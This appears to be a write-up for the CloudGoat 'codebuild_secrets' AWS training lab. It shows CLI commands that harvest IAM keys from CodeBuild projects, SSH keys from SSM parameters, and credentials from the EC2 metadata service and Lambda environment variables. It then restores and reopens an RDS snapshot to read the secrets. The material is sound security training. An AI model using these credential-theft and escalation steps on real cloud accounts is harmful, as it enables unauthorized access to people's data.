# Code Build Secrets

Starting as the IAM user Solo, the attacker first enumerates and explores CodeBuild projects, finding unsecured IAM keys for the IAM user Calrissian therein. Then operating as Calrissian, the attacker discovers an RDS database. Unable to access the database's contents directly, the attacker can make clever use of the RDS snapshot functionality to acquire the scenario's goal: a pair of secret strings.

Alternatively, the attacker may explore SSM parameters and find SSH keys to an EC2 instance. Using the metadata service, the attacker can acquire the EC2 instance-profile's keys and push deeper into the target environment, eventually gaining access to the original database and the scenario goal inside (a pair of secret strings) by a more circuitous route.

GoalA pair of secret strings stored in a secure RDS database.


# Walkthrough

## Option 1: Snapshot 
### Login 
```
aws configure --profile solo
```

### List code build objects and rds instance
```
aws codebuild list-projects --profile solo
Found project name e.g. cg-codebuild-codebuild_secrets_cgid23aykmyrb8

aws codebuild batch-get-projects --names cg-codebuild-codebuild_secrets_cgid23aykmyrb8 --profile solo
Found calrissian-aws-access-key and calrissian-aws-secret-key
```

### Assume calrissian and list rds instances
```
aws configure --profile calrissian

aws rds describe-db-instances --profile calrissian
Found instance cg-rds-instance-codebuild-secrets-cgid23aykmyrb8 with username: cgadmin, dbname: securedb
```

### Create snapshot and change password
```
aws rds create-db-snapshot --profile calrissian --db-instance-identifier cg-rds-instance-codebuild-secrets-cgid23aykmyrb8 --db-snapshot-identifier securedb-snapshot

aws rds describe-db-subnet-groups --profile calrissian
Got: cloud-goat-rds-testing-subnet-group-codebuild_secrets_cgid23aykmyrb8. Needs to be in the public subnets
aws ec2 describe-security-groups --profile calrissian
Got sg-0d83ae58e60f3a655, includes your IP address and the private address ranges

aws rds restore-db-instance-from-db-snapshot --db-instance-identifier restored-secure-db --db-snapshot-identifier securedb-snapshot --db-subnet-group-name cloud-goat-rds-testing-subnet-group-codebuild_secrets_cgid23aykmyrb8 --publicly-accessible --vpc-security-group-ids sg-0d83ae58e60f3a655 --profile calrissian

!! Note that the AddTagsToResource is required for the above command to work!

aws rds modify-db-instance --db-instance-identifier restored-secure-db --master-user-password cloudgoat --profile calrissian
```

### Login to rds instance 

```
psql postgresql://cgadmin@restored-secure-db2.cgsyel6spw2r.us-east-1.rds.amazonaws.com:5432/postgres

List available databases
\l  

Change to database
\c securedb

List tables
\dt
SELECT * FROM sensitive_information;

 name |                   value                    
------+--------------------------------------------
 Key1 | V\!C70RY-PvyOSDptpOVNX2JDS9K9jVetC1xI4gMO4
 Key2 | V\!C70RY-JpZFReKtvUiWuhyPGF20m4SDYJtOTxws6
```

## Option 2: EC2 Metadata Service

### List SSM parameters
```
aws ssm describe-parameters --profile solo
Found two keys: cg-ec2-private-key-codebuild_secrets_cgid23aykmyrb8 and cg-ec2-public-key-codebuild_secrets_cgid23aykmyrb8. For both the data type is text, i.e. stored in plaintext.

Describe each parameter one by one:
aws ssm get-parameter --profile solo --name cg-ec2-private-key-codebuild_secrets_cgid23aykmyrb8
aws ssm get-parameter --profile solo --name cg-ec2-public-key-codebuild_secrets_cgid23aykmyrb8

Save the plaintext keys into private_key.pem and public_key.crt correspondingly
Change the private key to have permissions to use
chmod 400 private_key.pem
```

### Connect to EC2 instance
```
aws ec2 describe-instances --profile solo
Found instance i-076aeab2ec2a5ff06, with cg-ec2-key-pair-codebuild_secrets_cgid23aykmyrb8 and at 54.156.77.48

ssh -i private_key.pem ubuntu@54.156.77.48
```

### Retrieve instance metadata role
```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-codebuild_secrets_cgid23aykmyrb8
```

### List lambda functions and its environmental variables
```
aws lambda list-functions --profile ec2 | grep build
Got function name cg-lambda-codebuild_secrets_cgid23aykmyrb8

aws lambda get-function --function-name cg-lambda-codebuild_secrets_cgid23aykmyrb8 --profile ec2
Got DB_USER, DB_NAME and DB_PASSWORD
wagrrrrwwgahhhhwwwrrggawwwwwwrr, cgadmin
```

### List RDS instances for endpoint
```
aws rds describe-db-instances --profile ec2
Got cg-rds-instance-codebuild-secrets-cgid23aykmyrb8.cgsyel6spw2r.us-east-1.rds.amazonaws.com
```

### Login to RDS instance via EC2 instance
```
psql postgresql://cgadmin@cg-rds-instance-codebuild-secrets-cgid23aykmyrb8.cgsyel6spw2r.us-east-1.rds.amazonaws.com:5432/postgres
Achieve same steps as option 1 for discovering sensitive information
```

## Option 2.b 
### Discover database credentials
```
In the ec2 instance query user-data
curl http://169.254.169.254/latest/user-data

Found password, endpoint and username
psql postgresql://cgadmin:wagrrrrwwgahhhhwwwrrggawwwwwwrr@cg-rds-instance-codebuild-secrets-cgid23aykmyrb8.cgsyel6spw2r.us-east-1.rds.amazonaws.com:5432/securedb
Login


```
# References